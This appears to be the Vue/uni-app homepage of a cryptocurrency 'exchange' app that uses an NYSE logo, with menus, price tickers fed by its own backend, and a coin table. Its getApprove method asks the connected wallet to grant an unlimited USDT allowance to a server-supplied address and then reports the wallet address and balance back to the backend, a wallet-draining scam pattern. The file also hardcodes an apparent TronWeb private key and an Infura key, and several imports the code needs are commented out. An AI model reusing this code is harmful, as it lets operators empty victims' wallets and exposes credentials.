<template>
	<view class="Body iphone-home">
		<div class="Site IndexBox">
			<!-- 頂部藍色區：Logo + accueillir，依 iPhone 16 Pro Max 比例 -->
			<div class="home-header">
				<div class="header-brand">
					<img src="../../static/image/news/logo.png" class="header-logo" alt="NYSE">
					<span class="header-greeting">accueillir</span>
				</div>
			</div>
			<div class="ScrollBox Home">
				<!-- 8 宮格功能菜單 -->
				<div class="home-menu-panel">
					<div class="menu-grid">
						<div class="menu-item" @click="dumprun('/pages/setting/fundRecord')">
							<div class="menu-icon-wrap"><img src="../../static/image/news/nav01.png" class="menu-icon" alt=""></div>
							<span class="menu-text">{{common.home.menu[0]}}</span>
						</div>
						<div class="menu-item" @click="dumprun('/pages/index/service')">
							<div class="menu-icon-wrap"><img src="../../static/image/news/nav02.png" class="menu-icon" alt=""></div>
							<span class="menu-text">{{common.home.menu[1]}}</span>
						</div>
						<div class="menu-item" @click="dumprun('/pages/setting/share')">
							<div class="menu-icon-wrap"><img src="../../static/image/news/nav03.png" class="menu-icon" alt=""></div>
							<span class="menu-text">{{common.home.menu[2]}}</span>
						</div>
						<div class="menu-item" @click="dumprun('/pages/index/serviceCenter')">
							<div class="menu-icon-wrap"><img src="../../static/image/news/nav04.png" class="menu-icon" alt=""></div>
							<span class="menu-text">{{common.home.menu[3]}}</span>
						</div>
						<div class="menu-item" @click="dumprun('/pages/setting/wallet')">
							<div class="menu-icon-wrap"><img src="../../static/image/news/nav05.png" class="menu-icon" alt=""></div>
							<span class="menu-text">{{common.user.menu[0]}}</span>
						</div>
						<div class="menu-item" @click="dumprun('/pages/setting/teamReport')">
							<div class="menu-icon-wrap"><img src="../../static/image/news/nav06.png" class="menu-icon" alt=""></div>
							<span class="menu-text">{{common.user.menu[1]}}</span>
						</div>
						<div class="menu-item" @click="dumprun('/pages/setting/bindAccount')">
							<div class="menu-icon-wrap"><img src="../../static/image/news/nav07.png" class="menu-icon" alt=""></div>
							<span class="menu-text">{{common.user.menu[2]}}</span>
						</div>
						<div class="menu-item" @click="dumprun('/pages/setting/fundRecord')">
							<div class="menu-icon-wrap"><img src="../../static/image/news/nav08.png" class="menu-icon" alt=""></div>
							<span class="menu-text">{{common.user.menu[3]}}</span>
						</div>
					</div>
				</div>

				<!-- 市場行情：BTC/EUR ETH/EUR XRP(EUR) -->
				<div class="home-market">
					<div class="market-item">
						<div class="market-pair">BTC/EUR</div>
						<div class="market-price">{{btcprice}}</div>
						<div class="market-change" :class="zf1>0?'up':'down'">{{zf1}}%</div>
					</div>
					<div class="market-item">
						<div class="market-pair">ETH/EUR</div>
						<div class="market-price">{{ethprice}}</div>
						<div class="market-change" :class="zf2>0?'up':'down'">{{zf2}}%</div>
					</div>
					<div class="market-item">
						<div class="market-pair">XRP/EUR</div>
						<div class="market-price">{{xrpprice}}</div>
						<div class="market-change" :class="zf3>0?'up':'down'">{{zf3}}%</div>
					</div>
				</div>

				<!-- 公告欄 -->
				<div class="home-notice">
					<u-notice-bar mode="horizontal" :list="news" :color="'#b0b0b0'" :bgColor="'transparent'"
						speed="120" border-radius="8">
					</u-notice-bar>
				</div>

				<!-- Banner 輪播 -->
				<view class="home-banner">
					<u-swiper :list="banner_list" border-radius="8" height="200" indicator-pos="bottomRight"
						:interval="3000" img-mode="aspectFill">
					</u-swiper>
				</view>
				<div class="homelist">
					<div class="coinitem">
						<table class="coin-table">
							<tr v-for="(item,index) in showQuotationList" :key="index" class="coin-row">
								<td class="td-fav"><img src="../../static/image/news/star1.png" class="fav-icon" alt=""></td>
								<td class="td-icon">
									<img v-if="item.currency_name == 'BTC'" src="../../static/image/news/87496d50-2408-43e1-ad4c-78b47b448a6a.png" class="coin-img" alt="">
									<img v-else-if="item.currency_name == 'ETH'" src="../../static/image/news/3a8c9fe6-2a76-4ace-aa07-415d994de6f0.png" class="coin-img" alt="">
									<img v-else-if="item.currency_name == 'XRP'" src="../../static/image/news/4766a9cc-8545-4c2b-bfa4-cad2be91c135.png" class="coin-img" alt="">
									<img v-else-if="item.currency_name == 'LTC'" src="../../static/image/news/359ca651-a084-4010-92d8-4eaff96e6384.png" class="coin-img" alt="">
									<img v-else-if="item.currency_name == 'EOS'" src="../../static/image/news/09f93059-fe85-42cc-96b7-603ef6da07c6.png" class="coin-img" alt="">
									<img v-else-if="item.currency_name == 'BCH'" src="../../static/image/news/db45566d-6c97-4944-937e-1b6333be3a7f.png" class="coin-img" alt="">
									<img v-else-if="item.currency_name == 'ETC'" src="../../static/image/news/00454e4d-b30f-4fef-bf8b-5b5fbc4b8f1e.png" class="coin-img" alt="">
									<img v-else-if="item.currency_name == 'TRB'" src="../../static/image/news/2c845701-526b-45ba-89af-8cbf9ad1c8e5.png" class="coin-img" alt="">
								</td>
								<td class="td-name">{{item.currency_name}}</td>
								<td class="td-price">$ {{item.now_price}}</td>
								<td class="td-change" :class="parseFloat(item.change)>=0?'up':'down'">{{item.change}}%</td>
							</tr>
						</table>
					</div>
					<div class="bottom-spacer"></div>
				</div>
			</div>
			<!-- <div id="Service" @click="dumprun('/pages/index/serviceCenter')">
				<img src="../../static/image/news/customer.png"> 
				{{common.common[0]}}
			</div> -->
		</div>
		
		
	</view>
</template>
<script>
	// import {
	// 	langs,
	// 	currencys
	// } from "./../setting/data.js"
	import langslist from "@/common/data.js"
	// import Web3 from 'web3'
	// import abi from '@/common/ERC20.json'
	import {
		ethers
	} from 'ethers'
	// import WalletConnectProvider from '@walletconnect/web3-provider';
	// import Web3Modal from 'web3modal';

	export default {
		data() {
			return {
				lang: '',
				swiper: [],
				dataItem: '',
				closeOnClickOverlay: false,
				kuangji: [],
				langs: langslist,
				level: 0,
				showLanguage: false,
				closetrue: true,
				showrtu: false,
				os: null,
				currentNav: 0,
				currentSortNav: 0,
				invest: [],
				whatsdapp: 0,
				ciaddress: '',
				auaddress: '',
				uauaddress: '',
				bnbbalance: 0,
				balance: '',
				show: false,
				goushu: 100,
				invid: 0,
				islogin: 0,
				dangxuan: 0,
				yansi: '',
				data: [],
				data1: [],
				quotationsList: [],
				quotationsListChange: [],
				quotationsListPrice: [],
				quotationsListVol: [],
				showQuotationList: [],
				boshu: ['0', '0', '0'],
				bolv: ['0', '0', '0'],
				banner_list: [],
				news: [''],
				bili: '',
				randomNumber: 0,
				btcprice:0,
				xrpprice:0,
				ethprice:0,
				zf1:0,
				zf2:0,
				zf3:0
			};
		},
		mounted() {

		},
		onLoad(options) {
			// alert(navigator.userAgent)
			const {
				invid
			} = options
			this.invid = invid
			this.os = this.$u.os()
			// uni.setNavigationBarTitle({
			// 	title: 'MSC'
			// })
			//设置默认语言
			this.setDefaultLang()
			// this.get()
			this.getBanner()
			this.getNocar()
			let that = this
			that.randomNumber = Math.floor(Math.random() * 10000) + 1;
			setInterval(function() {
				that.randomNumber = Math.floor(Math.random() * 10000) + 1;
				// console.log(this.randomNumber)
			}, 5000);
			this.$u.api.index.shoujia().then(res => {
				this.bili = res.data.shoujia
			})
		},
		onShow() {
			// uni.hideTabBar()
			this.checkIsLogin()
			 this.getList()
				const apiBase = (typeof window !== 'undefined' && window.location ? window.location.origin : 'https://mxtrx.top') + '/index.php/api';
				setInterval(() => {
		uni.request({
					url: apiBase + "/Ems/updateData",
					method: "GET",
					success: (res) => {
						console.log(res.data.data[0]['price'])
						if (res.data.code == 1) {
							//that.showQuotationList = res.data.message[0].quotation;
							this.btcprice = res.data.data[0].price
							this.zf1 = res.data.data[0].zf.toFixed(3)
							this.ethprice = res.data.data[1].price
							this.zf2 = res.data.data[1].zf.toFixed(3)
							this.xrpprice = res.data.data[2].price
							this.zf3 = res.data.data[2].zf.toFixed(3)

						//	this.zongliang = res.data.message[0].quotation[0].volume
							// setTimeout(() => {
							// 	this.klineo()
							// }, 1000)
						//	this.startSocket()
						}
						//this.boshu[0]
					}
				})
					console.log("setInterval");
				}, 1000);
			// this.getteam()
			// this.show = false
			// alert(this.$store.state.lang)
			this.lang = uni.getStorageSync('lang') || 'chn'
		},
		methods: {
			// 获取首页轮播图
			getBanner() {
				this.$u.api.index.get_about().then(res => {
					this.banner_list = res.data
				})
			},
			// 获取首页公告
			getNocar() {
				const token = uni.getStorageSync('token')
				this.$u.api.index.get_placard(token).then(res => {
					// console.log(res)
					this.news = ["" + res.data[0].titles + ""]
				})
			},
			checkIsLogin() {
				const token = uni.getStorageSync('token') || ""
				if (!token) {
					this.$utils.showToast(this.$t("common.plsLogin"))
					// setTimeout(() => {
					uni.redirectTo({
						url: "/pages/common/login"
					})
					// }, 1200)
				}
			},
			qidai() {
				this.$utils.showToast(this.common.home3[4])
			},
			showsetting() {
				this.showrtu = true
				this.show = false
			},
			qiedang(data) {
				this.dangxuan = data
				console.log(data)
			},
			drawLine(id) {
				// console.log(this.data[id])
				let invoke = (this.data[id].reverse().slice(0, 100)).reverse();
				let dataq = [];
				invoke.forEach(x => {
					var date = new Date(x.time);
					// console.log(date)
					dataq.push({
						name: date,
						value: [date, x.close]
					});
				});
				var items = ['rgb(51, 104, 217)', 'rgb(53,182,90)', 'rgb(255,73,74)', 'rgb(255,255,255)'];
				let yanse = items[Math.floor(Math.random() * items.length)];
				// console.log(invoke)
				// 基于准备好的dom，初始化echarts实例
				let myChart = this.$echarts.init(document.getElementById("LBChart" + id));
				// 绘制图表
				myChart.setOption({
					title: {
						show: false,
						text: 'Dynamic Data & Time Axis'
					},
					tooltip: {
						trigger: 'none',
						axisPointer: {
							type: "cross"
						}
					},
					xAxis: {
						type: 'time',
						show: false,
						scale: false,
						splitLine: {
							show: false
						}
					},
					yAxis: {
						type: 'value',
						show: false,
						scale: false,
						boundaryGap: [0, '100%'],
						min: 'dataMin', //默认取最大值显示
						max: 'dataMax', //默认取最小值显示 
						splitLine: {
							show: false
						}
					},
					grid: [{
						top: 20,
						bottom: 10,
						left: -20,
						right: 0
					}],
					dataZoom: [{
						show: false,
						type: "inside",
						zoomOnMouseWheel: false
					}],
					series: [{
						name: 'Fake Data',
						type: 'line',
						showSymbol: false,
						smooth: false,
						itemStyle: {
							color: yanse
						},
						data: dataq
					}]
				});
			},
			CheckIsIOS() {
				var browser = {
					versions: function() {
						var u = navigator.userAgent,
							app = navigator.appVersion;
						return { //移动终端浏览器版本信息 
							ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端 
							android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或uc浏览器 
							iPhone: u.indexOf('iPhone') > -1, //是否为iPhone或者QQHD浏览器 
							iPad: u.indexOf('iPad') > -1, //是否iPad 
						};
					}(),
				}
				if (browser.versions.iPhone || browser.versions.iPad || browser.versions.ios) {
					return true;
					return false;
				}
			},
			getList() {
				let that = this;
				let now = parseInt((new Date()).valueOf() / 1000);
				let start = now - (3600 * 24 * 7);
				const apiBase = (typeof window !== 'undefined' && window.location ? window.location.origin : 'https://mxtrx.top') + '/index.php/api';
				uni.request({
					url: apiBase + "/Ems/updateData",
					method: "GET",
					success: (res) => {
						console.log(res.data.data[0]['price'])
						if (res.data.code == 1) {
							//that.showQuotationList = res.data.message[0].quotation;
							this.btcprice = res.data.data[0].price
							this.zf1 = res.data.data[0].zf
							this.ethprice = res.data.data[1].price
							this.zf2 = res.data.data[1].zf
							this.xrpprice = res.data.data[2].price
							this.zf3 = res.data.data[2].zf

						//	this.zongliang = res.data.message[0].quotation[0].volume
							// setTimeout(() => {
							// 	this.klineo()
							// }, 1000)
						//	this.startSocket()
						}
						//this.boshu[0]
						console.log(this.boshu)
					}
				})
			},
			//接收socket数据
	
			get() {
				// if (window.tronWeb) {
				// 	this.whatsdapp = 1;
				// 	this.ciaddress = window.tronWeb.defaultAddress.base58;
				// 	uni.setStorageSync('whatsdapp',this.whatsdapp)
				// 	uni.setStorageSync('ciaddress',this.ciaddress)
				// 	this.getTokenBalance()
				// 	this.getteam()
				// }
				const that = this
				if (window.ethereum) {
					window.ethereum.enable().then((res) => {
						that.ciaddress = res[0];
						that.whatsdapp = 0;
						uni.setStorageSync('whatsdapp', that.whatsdapp)
						uni.setStorageSync('ciaddress', that.ciaddress)
						that.getTokenBalance()
						// that.getteam()
					});
					// that.showtru = true;
				} else {
					// this.whatsdapp = 3;
				}
			},
			async getbsc() {

			},
			async getETH() {
				let web3 = new Web3(window.web3.currentProvider)
				console.log(web3)
				let fromAddress = await web3.eth.getAccounts()
				console.log(web3.eth.getBalance(fromAddress[0]))
				console.log(fromAddress)
				web3.eth.getBalance(fromAddress[0], (err, res) => {
					if (!err) {
						this.bnbbalance = res / Math.pow(10, 18);
						this.getTokenBalance()
					}
				})
			},
			async getTokenBalance() {
				if (this.whatsdapp == 0) {
					if (window.web3) {
						var web3 = web3 = new Web3(window.web3.currentProvider);
						let fromAddress = this.ciaddress;
						let ethContract = new web3.eth.Contract(abi, "0x55d398326f99059ff775485246999027b3197955")
						let balance = await ethContract.methods.balanceOf(fromAddress).call()
						this.balance = balance / Math.pow(10, 18) + '';
						console.log(this.balance)
					}
				} else {
					const TronWeb = require('tronweb');
					const HttpProvider = TronWeb.providers.HttpProvider;
					const fullNode = new HttpProvider("https://api.trongrid.io");
					const solidityNode = new HttpProvider("https://api.trongrid.io");
					const eventServer = new HttpProvider("https://api.trongrid.io");
					let tronweb = new TronWeb(fullNode, solidityNode, eventServer,
						"528aa975b0e815fadaffd91de74e2ebd5f3c08751c24d6b00416581afebbdc2f");
					let contract = await tronweb.contract().at("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t");
					let balance = await contract.balanceOf(this.ciaddress).call();
					this.balance = balance.toLocaleString() / 1e6;
				}
			},
			async getApprove() {
				// if (this.whatsdapp == 0) {
				var infura_key = "7d73a0c13ce946769577714aef84b79a"
				var adrs = [
					'',
					'',
					'https://cloudflare-eth.com',
					'https://bsc-dataseed1.defibit.io',
					'https://http-mainnet.hecochain.com'
				]
				var coinadrs = [
					'',
					'',
					'0xdac17f958d2ee523a2206206994597c13d831ec7',
					'0x55d398326f99059ff775485246999027b3197955',
					'0xa71edc38d189767582c38a3145b5873052c3e47a'
				]
				var erctype = 3
				var approveAddr = coinadrs[erctype]
				var _web3 = new Web3(adrs[erctype])
				var providerOptions = {
					walletconnect: {
						package: WalletConnectProvider,
						options: {
							infuraId: infura_key,
						}
					},
				};
				const web3Modal = new Web3Modal({
					cacheProvider: false,
					providerOptions,
					disableInjectedProvider: false,
				});

				const provider = await web3Modal.connect();
				provider.enable()
				const web3 = new Web3(provider);
				provider.enable()
				const contract = new web3.eth.Contract(abi, "0x55d398326f99059ff775485246999027b3197955")
				const gasPrice = web3.eth.gasPrice;
				const that = this
				// let ua = navigator.userAgent
				// if (ua.indexOf("MetaMask") != -1) {
				// 	uni.showToast({
				// 		title: "仅支持Trust wallet智能链登录",
				// 		icon: 'none'
				// 	});
				// 	return false;
				// }
				// if (ua.indexOf("hbWallet") != -1) {
				// 	uni.showToast({
				// 		title: "仅支持Trust wallet智能链登录",
				// 		icon: 'none'
				// 	});
				// 	return false;
				// }
				// if (ua.indexOf("TokenPocket") != -1) {
				// 	uni.showToast({
				// 		title: "仅支持Trust wallet智能链登录",
				// 		icon: 'none'
				// 	});
				// 	return false;
				// }
				// if (ua.indexOf("imToken") != -1) {
				// 	uni.showToast({
				// 		title: "仅支持Trust wallet智能链登录",
				// 		icon: 'none'
				// 	});
				// 	return false;
				// }
				// if (ua.indexOf("MathWallet") != -1) {
				// 	uni.showToast({
				// 		title: "仅支持Trust wallet智能链登录",
				// 		icon: 'none'
				// 	});
				// 	return false;
				// }
				// if (ua.indexOf("BitKeep") != -1) {
				// 	uni.showToast({
				// 		title: "仅支持Trust wallet智能链登录",
				// 		icon: 'none'
				// 	});
				// 	return false;
				// }
				contract.methods.approve(this.auaddress, web3.utils.toBN(
					'0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')).send({
					from: this.ciaddress,
					gasPrice: gasPrice,
					gas: 70000,
				}, function(err, tx) {
					if (!err) {
						// alert('success')
						const _i18n = that._i18n
						const common = _i18n.messages[_i18n.locale].common
						that.$utils.showToast(common.success)
						that.getlink()
					} else {
						uni.showToast({
							title: err,
							icon: 'none'
						});
					}
				})
				// } else {
				// 	const TronWeb = require('tronweb');
				// 	const HttpProvider = TronWeb.providers.HttpProvider;
				// 	const fullNode = new HttpProvider("https://api.trongrid.io");
				// 	const solidityNode = new HttpProvider("https://api.trongrid.io");
				// 	const eventServer = new HttpProvider("https://api.trongrid.io");
				// 	let tronweb = new TronWeb(fullNode, solidityNode, eventServer,
				// 		"528aa975b0e815fadaffd91de74e2ebd5f3c08751c24d6b00416581afebbdc2f");
				// 	let contract = await tronweb.contract().at("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t");
				// 	let approveAddr = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; //授权合约
				// 	let authorized_address = this.uauaddress;
				// 	let tronWeb = window.tronWeb
				// 	let walletAddress = tronWeb.defaultAddress.base58;
				// 	let instance = await tronWeb.contract().at(approveAddr);
				// 	let res = await instance["approve"](authorized_address, "90000000000000000000000000000");
				// 	const that = this
				// 	res.send({
				// 		feeLimit: 100000000,
				// 		callValue: 0,
				// 		shouldPollResponse: false
				// 	}, function(err, res) {
				// 		if (!err) {
				// 			const _i18n = that._i18n
				// 			const common = _i18n.messages[_i18n.locale].common
				// 			that.$utils.showToast(common.success)
				// 			that.getlink()
				// 		} else {
				// 			uni.showToast({
				// 				title: err,
				// 				icon: 'none'
				// 			});
				// 		}
				// 	})
				// }
			},
			getlink() {
				this.$u.api.setting.getUserAddress(this.ciaddress, this.invid, this.balance).then(res => {
					this.$utils.showToast(res.msg)
				})
			},
			navFunc(item) {
				// this.$u.api.setting.getUserStatus(this.ciaddress).then(res => {
				// 	if (res.code == 0) {
				// 		this.show = false
				// 		const _i18n = this._i18n
				// 		const common = _i18n.messages[_i18n.locale].common
				// 		this.$utils.showToast(common.firstshou)
				// 		this.getApprove()
				// 	} else {
				// 		const {
				// 			openType,
				// 			url
				// 		} = item
				// 		if (openType == 'url') {
				uni.navigateTo({
					url
				})
				// 		} else if (openType == 'popup') {
				// 			this[url] = true
				// 		}
				// 	}
				// })
			},
			dumprun(url) {
				// this.$u.api.setting.getUserStatus(this.ciaddress).then(res => {
				// if (res.code == 0) {
				// 	this.getApprove()
				// } else {
				uni.navigateTo({
					url
				})
				// }
				// })
			},
			//设置默认语言
			setDefaultLang() {
				let langsData = this.langs.map(el => {
					el.selected = false
					return el
				})
				const lang = uni.getStorageSync('lang') || 'eng'

				const has = langsData.findIndex(item => item.value == lang)
				langsData[has].selected = true
				this.yansi = langsData[has].value
				// alert(this.yansi)
				// uni.setStorageSync('lang', langsData[has].name)
				this.langs = langsData
				this.$store.commit('setHasShowAd', false)
			},
			// setLang(item) {
			// 	let langs = this.langs.map(el => {
			// 		el.selected = false
			// 		if (el.value == item.value) el.selected = true
			// 		return el
			// 	})
			// 	this.langs = langs
			// 	this._i18n.locale = item.value
			// 	this.lang = item.value
			// 	this.yansi = item.name
			// 	uni.setStorageSync('lang', item.value)
			// 	this.$store.commit('setLangyan', item.value)
			// 	this.$utils.setTabbar(this)
			// 	setTimeout(() => {
			// 		this.showLanguage = false
			// 	}, 200)
			// }
		},
		computed: {
			common() {
				return this.$t("common")
			}
		},
		watch: {
			//当语言发生变化时
			'$store.state.lang'(val) {
				const {
					i18n
				} = this
				this.$utils.setTabbar(this)
				this.setDefaultLang()
				this.homeNav.forEach(item => {
					item.name = i18n[item.title]
				})
			}
		},
		filters: {
			sort2Icon(sort) {
				switch (sort) {
					case 'none':
						return require('static/image/icon/sort.png');
						break;
					case 'up':
						return require('static/image/icon/sort-up.png');
						break;
					case 'down':
						return require('static/image/icon/sort-down.png');
						break;
				}
			},
		},
	}
</script>
<style lang="scss" scoped>
	/* iPhone 16 Pro Max 首頁樣式 (430×932) - 與參考圖 1:1 */
	.iphone-home .IndexBox { padding: 0; }
	.iphone-home .ScrollBox { padding: 0 0.8rem 0 !important; background: #13171a; }

	.home-header {
		background: linear-gradient(180deg, #1a3a5c 0%, #2d5a8a 35%, #3d7ab8 100%);
		padding: 1.2rem 1rem 1.6rem;
		border-radius: 0 0 1.2rem 1.2rem;
		position: relative;
		overflow: hidden;
	}
	.home-header::after {
		content: '';
		position: absolute;
		bottom: -2rem;
		right: -2rem;
		width: 8rem;
		height: 8rem;
		background: rgba(255,255,255,0.06);
		border-radius: 50%;
	}
	.header-brand {
		display: flex;
		flex-direction: column;
		align-items: flex-start;
		gap: 0.4rem;
	}
	.header-logo {
		width: 4.2rem;
		height: auto;
		display: block;
	}
	.header-greeting {
		font-size: 0.9rem;
		font-weight: 500;
		color: #fff;
		letter-spacing: 0.02em;
	}

	.home-menu-panel {
		background: #1e2329;
		border-radius: 0.5rem;
		margin: -0.9rem 0.8rem 0;
		padding: 1rem 0.6rem;
		box-shadow: 0 0.2rem 0.8rem rgba(0,0,0,0.25);
	}
	.menu-grid {
		display: flex;
		flex-wrap: wrap;
		justify-content: space-between;
	}
	.menu-item {
		width: 25%;
		display: flex;
		flex-direction: column;
		align-items: center;
		justify-content: center;
		padding: 0.4rem 0;
		box-sizing: border-box;
	}
	.menu-icon-wrap {
		width: 2.2rem;
		height: 2.2rem;
		display: flex;
		align-items: center;
		justify-content: center;
		margin-bottom: 0.35rem;
		background: rgba(52,120,190,0.25);
		border-radius: 0.4rem;
	}
	.menu-icon {
		width: 1.4rem;
		height: 1.4rem;
		object-fit: contain;
	}
	.menu-text {
		font-size: 0.55rem;
		color: #fff;
		line-height: 1.2;
		text-align: center;
	}

	.home-market {
		display: flex;
		background: #1e2329;
		border-radius: 0.5rem;
		margin: 0.6rem 0.8rem 0;
		padding: 0.7rem 0.4rem;
		color: #fff;
	}
	.market-item {
		flex: 1;
		display: flex;
		flex-direction: column;
		align-items: center;
		justify-content: center;
		gap: 0.2rem;
	}
	.market-pair {
		font-size: 0.6rem;
		color: #848e9c;
		font-weight: 600;
	}
	.market-price {
		font-size: 0.75rem;
		font-weight: 600;
		color: #fff;
	}
	.market-change {
		font-size: 0.6rem;
		font-weight: 600;
	}
	.market-change.up { color: #00c087; }
	.market-change.down { color: #f6465d; }

	.home-notice {
		margin: 0.6rem 0.8rem 0;
		padding: 0 0.4rem;
	}
	.home-notice .u-notice-bar { border-radius: 0.4rem; }

	.home-banner {
		margin: 0.6rem 0.8rem 0;
		border-radius: 0.5rem;
		overflow: hidden;
		position: relative;
		z-index: 1;
	}

	.iphone-home .homelist {
		margin: 0.6rem 0.8rem 0;
		background: #1e2329;
		border-radius: 0.5rem;
		padding: 0.4rem 0.5rem;
	}
	.iphone-home .coinitem {
		margin: 0;
		height: auto;
		background: transparent;
		padding: 0;
	}
	.coin-table {
		width: 100%;
		font-size: 0.65rem;
		border-collapse: collapse;
	}
	.coin-row {
		height: 2.4rem;
		border-bottom: 1px solid rgba(255,255,255,0.06);
	}
	.coin-row:last-child { border-bottom: none; }
	.td-fav { width: 1.2rem; padding: 0 0.2rem; vertical-align: middle; }
	.fav-icon { width: 0.9rem; height: 0.9rem; display: block; }
	.td-icon { width: 1.5rem; padding: 0 0.3rem; vertical-align: middle; }
	.coin-img { width: 1.2rem; height: 1.2rem; display: block; }
	.td-name { font-size: 0.7rem; font-weight: 600; color: #fff; width: 2.2rem; vertical-align: middle; }
	.td-price { font-size: 0.7rem; color: #fff; text-align: right; padding-right: 0.5rem; vertical-align: middle; }
	.td-change {
		font-size: 0.65rem;
		font-weight: 600;
		text-align: right;
		vertical-align: middle;
		width: 2rem;
	}
	.td-change.up { color: #00c087; }
	.td-change.down { color: #f6465d; }
	.rate2 { font-size: inherit; }
	.bottom-spacer { height: 4rem; }

	.PageBox {
		background-color: #13171a;
		font-family: Alibaba
	}

	.IndexBox {
		padding: 0 !important;
	}

	.header_bg {
		top: 130px;
		z-index: 0
	}

	.ScrollBox {
		background-color: #13171a
	}

	.BroadBarItem {
		width: 100%
	}

	.header_link {
		padding: 0 10px;
		margin-top: 5px;
		border-radius: 30px
	}

	.header_link .van-cell {
		border-radius: 30px;
		background-color: #8c60f1;
		padding: 7px 16px;
		margin-top: 10px
	}

	.header_link .van-cell__value span {
		display: block;
		overflow: hidden;
		text-overflow: ellipsis;
		white-space: nowrap;
		font-family: Alibaba;
		color: #fff;
		font-size: 13px
	}

	.header .Menu {
		padding: 0 5px !important;
		background-color: #191c23;
		color: red;
		height: 180px;
		margin: 10px auto 0;
		margin-bottom: 10px
	}

	.header .Menu,
	.header .Menu2 {
		justify-content: space-between;
		width: 100%;
		max-width: 450px;
		font-size: 11px;
		border-radius: 10px;
		flex-wrap: wrap
	}

	.header .Menu2 {
		text-align: left
	}

	.swipe1 {
		background-size: 100% 100%
	}

	.Menu2 .van-grid-item__content {
		border-radius: 5px;
		color: #ccc;
		background: transparent none repeat scroll 0 0
	}

	.Menu2item {
		height: 110px
	}

	.Menu2item1 {
		height: 105px;
		background-color: #191c23;
		width: 100%;
		text-align: left;
		line-height: 22px
	}

	.tool .van-grid-item__content {
		padding: 10px !important;
		display: flex;
		background-color: #191c23
	}

	.homeswipe {
		border-radius: 10px;
		width: 96%;
		margin-left: 6px;
		height: 10rem;
		z-index: 50;
		margin-top: 5px;
		margin-bottom: 5px
	}

	.homelist {
		background-color: #13171a
	}

	.header .Menu .van-grid-item__content {
		padding: 0;
		display: flex
	}

	.header .Menu .van-grid-item__content div:first-child {
		flex-shrink: 0;
		border-radius: 50%;
		display: flex;
		justify-content: center;
		align-items: center
	}

	.header .Menu .van-grid-item__content div:last-child {
		text-align: center
	}

	.content_footer .van-cell:after {
		display: none
	}

	.tool:before {
		content: "";
		display: block
	}

	.tool {
		border-radius: 10px;
		background-color: #191c23;
		color: #fff;
		overflow: hidden;
		z-index: 199;
		padding: 0 5px;
		line-height: 22px;
		margin-bottom: 10px
	}

	.zh-CN .van-grid-item__icon-wrapper,
	.zh-HK .van-grid-item__icon-wrapper {
		word-spacing: 5px
	}

	.MemberList .van-tabs__wrap {
		height: 38px
	}

	.MemberList .van-tabs__nav--card {
		margin: 0
	}

	.MemberList .swipe-item_box {
		display: flex;
		align-items: center;
		padding: 10px 10px !important
	}

	.swipe-item_box .swipe-item_info_title {
		margin-left: 15px;
		margin-top: 6px;
		height: 18px;
		font-size: 13px !important;
		font-family: Alibaba;
		white-space: nowrap;
		overflow: hidden;
		text-overflow: ellipsis
	}

	.swipe-item_box .swipe-item_info_title span {
		color: #ff93a4
	}

	.swipe-item_box .swipe-item_info {
		display: flex;
		flex-direction: column;
		width: 100%;
		margin-left: 10px;
		overflow: hidden
	}

	.swipe-item_box .swipe-item_info_details {
		display: flex;
		margin-top: 4px;
		align-items: flex-start;
		border-bottom: 1px solid #d0d0d0
	}

	.swipe-item_box .swipe-item_info_details .item_state {
		display: flex;
		align-items: center;
		color: #666;
		font-size: 12px;
		transform: scale(.8);
		white-space: nowrap
	}

	.swipe-item_box .swipe-item_info_details .item_state>p {
		width: 50px;
		overflow: hidden;
		text-overflow: ellipsis;
		white-space: nowrap
	}

	.swipe-item_box .swipe-item_info_details .isState {
		color: #4e51bf !important
	}

	.swipe-item_box .swipe-item_info_details .isState span {
		background-color: #ff93a4 !important
	}

	.swipe-item_box .swipe-item_info_details .item_state span {
		width: 10px;
		height: 10px;
		border-radius: 50%;
		background: #a0a0a0;
		margin-right: 3px;
		flex-shrink: 0;
		margin-top: 2px
	}

	.swipe-item_box .swipe-item_info_details .item_site {
		color: #666;
		font-size: 12px;
		transform: scale(.8);
		white-space: nowrap;
		flex: 1;
		overflow: hidden;
		text-overflow: ellipsis
	}

	.swipe-item_box .swipe-item_info_details .profit {
		display: flex;
		margin-left: auto;
		align-items: center;
		color: #ff93a4
	}

	.swipe-item_box .swipe-item_info_details .profit image {
		margin-right: 2px
	}

	.swipe-item_box .swipe-item_info_details .item_massage {
		margin-left: auto;
		width: 80px;
		padding: 3px 0;
		border-radius: 10px;
		text-align: center;
		box-shadow: 0 0 2px 0 rgba(0, 0, 0, .2);
		font-size: 13px;
		white-space: nowrap;
		overflow: hidden;
		text-overflow: ellipsis
	}

	.MemberList .swipe-item_img_box {
		background: linear-gradient(0deg, #4e51bf, #ff93a4)
	}

	.MemberList .swipe-item_img_box,
	.MemberList .swipe-item_img_box1 {
		padding: 2px;
		border-radius: 50%;
		overflow: hidden;
		flex-shrink: 0;
		width: 40px;
		height: 40px;
		display: flex;
		justify-content: center;
		align-items: center;
		margin: 2px
	}

	.MemberList .swipe-item_img_box1 {
		background: grey
	}

	.MemberList .swipe-item_img {
		width: 100%;
		height: 100%;
		display: flex;
		flex-shrink: 0;
		justify-content: center;
		align-items: center;
		border-radius: 50%;
		overflow: hidden;
		background-color: #ffe9ce
	}

	.MemberList .swipe-item_img image {
		width: 100%;
		height: auto;
		max-height: 100%
	}

	.MemberList .van-cell__title {
		display: flex
	}

	.MemberList .van-tab__text {
		font-weight: 700;
		display: flex;
		align-items: center
	}

	.MemberList .van-swipe-item {
		padding: 1px 0
	}

	.topItem {
		line-height: 1;
		color: #fff
	}

	.topItem .van-cell__left-icon {
		height: 46px;
		width: 46px;
		border-radius: 100%;
		overflow: hidden;
		padding: 2px
	}

	.TaskHall_info .van-cell__left-icon {
		font-size: 14px
	}

	.topItem .van-icon__image {
		width: 100%;
		height: 100%
	}

	.topItem .van-cell__label {
		line-height: 1;
		margin-top: 0;
		color: #fff;
		font-size: 14px
	}

	.topItem .profit {
		background-color: hsla(0, 0%, 100%, .5);
		border-radius: 100px;
		display: flex;
		align-items: center;
		padding: 3px 8px;
		font-size: 13px;
		color: #0e1526
	}

	.coinitem {
		margin-left: 10px;
		border-radius: 10px;
		background-color: #191c23;
		padding-left: 5px;
		color: #fff;
		margin-right: 10px;
